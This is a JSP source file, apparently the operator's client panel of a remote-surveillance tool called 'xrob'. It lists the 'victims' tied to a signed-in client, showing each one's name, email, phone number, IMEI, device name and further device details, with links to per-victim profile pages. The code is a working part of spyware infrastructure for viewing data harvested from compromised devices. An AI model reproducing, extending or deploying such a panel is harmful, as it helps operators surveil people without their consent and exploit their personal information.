<%@ page import="com.theah64.xrob.api.models.Victim" %>
<%@ page import="com.theah64.xrob.api.utils.CommonUtils" %>
<%@ page import="java.util.List" %>
<%@ page import="com.theah64.xrob.api.utils.clientpanel.HtmlTemplates" %>
<%--
  Created by IntelliJ IDEA.
  User: theapache64
  Date: 12/9/16
  Time: 4:08 PM
  To change this template use FileNode | Settings | FileNode Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@include file="signin_check.jsp" %>

<html>
<head>
    <title>Client panel</title>
    <%@include file="../common_headers.jsp" %>
    <%
        final HtmlTemplates.SearchTemplate searchTemplate = new HtmlTemplates.SearchTemplate("tVictims", "clickable_data");
    %>
    <script>
        $(document).ready(function () {

            //Row click
            $("table#tVictims td.clickable_data").click(function () {
                window.document.location = $(this).parent().data("href");
            });

            <%=searchTemplate.getSearchScript()%>

        });
    </script>
</head>
<body>
<div class="container">
    <%@include file="header.jsp" %>

    <div class="row text-center">
        <ul id="nav_menu" class="breadcrumb">
            <li class="active">Victims</li>
        </ul>
    </div>

    <%
        final List<Victim> victims = Clients.getInstance().getVictims(session.getAttribute(Clients.COLUMN_ID).toString());
        if (victims != null) {

    %>

    <div class="row">
        <%--Generate table here--%>
        <div class="col-md-12 content-centered">


            <%=searchTemplate.getTopTemplate(CommonUtils.getProperSentense(victims.size(), "one victim", victims.size() + " victims"), "")%>

            <table id="tVictims" class="table table-bordered">
                <tr>
                    <th>Name</th>
                    <th>Email</th>
                    <th>Phone</th>
                    <th>IMEI</th>
                    <th>Device</th>
                    <%-- <th>Device info</th>--%>
                </tr>

                <%
                    for (final Victim victim : victims) {
                %>
                <tr class="data_row" data-href="/client/victim/profile/<%=victim.getVictimCode()%>">
                    <td class="clickable_data"><%=victim.getName() != null ? victim.getName() : "-"%>
                    </td>
                    <td class="clickable_data"><%=victim.getEmail() != null ? victim.getEmail() : "-"%>
                    </td>
                    <td class="clickable_data"><%=victim.getPhone() != null ? victim.getPhone() : "-"%>
                    </td>
                    <td class="clickable_data"><%=victim.getIMEI() != null ? victim.getIMEI() : "-"%>
                    </td>
                    <td data-toggle="collapse" data-target="#<%=victim.getId()%>"><%=victim.getDeviceName()%><span
                            class="label label-default pull-right">more...</span>

                        <div id="<%=victim.getId()%>" class="collapse">
                            <%=Victim.getDeviceInfoReadable(victim.getOtherDeviceInfo())%>
                        </div>
                    </td>
                </tr>

                <%
                    }
                %>

            </table>

        </div>

    </div>
    <%


    } else {
    %>
    <%=HtmlTemplates.getErrorHtml("No victim connected")%>
    <%
        }
    %>

</div>
</body>
</html>
